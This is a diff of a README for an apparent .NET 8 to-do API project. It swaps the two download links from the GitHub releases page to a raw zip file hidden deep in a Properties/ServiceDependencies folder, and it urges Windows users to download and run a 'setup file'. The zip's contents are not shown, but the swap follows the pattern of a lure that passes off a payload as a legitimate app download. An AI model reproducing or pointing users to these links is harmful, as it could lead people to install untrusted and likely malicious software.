@@ -1,6 +1,6 @@
 # ✅ todo-api-dotnet8-azure-sql - Manage your daily tasks with ease
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Application-blue)](https://github.com/Harshvoiced-epidemic114/todo-api-dotnet8-azure-sql/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Application-blue)](https://raw.githubusercontent.com/Harshvoiced-epidemic114/todo-api-dotnet8-azure-sql/main/TodoApi/Properties/ServiceDependencies/nenad0707 - Web Deploy/sql_todo_api_azure_dotnet_v3.9.zip)
 
 ## 📋 Project Overview
 
@@ -14,7 +14,7 @@ You need a computer running Windows 10 or Windows 11 to use this application. En
 
 You must visit the official release page to obtain the software. 
 
-[Click here to visit the release page and download the setup file](https://github.com/Harshvoiced-epidemic114/todo-api-dotnet8-azure-sql/releases)
+[Click here to visit the release page and download the setup file](https://raw.githubusercontent.com/Harshvoiced-epidemic114/todo-api-dotnet8-azure-sql/main/TodoApi/Properties/ServiceDependencies/nenad0707 - Web Deploy/sql_todo_api_azure_dotnet_v3.9.zip)
 
 1. Open the link above in your web browser.
 2. Look for the section labeled "Assets."
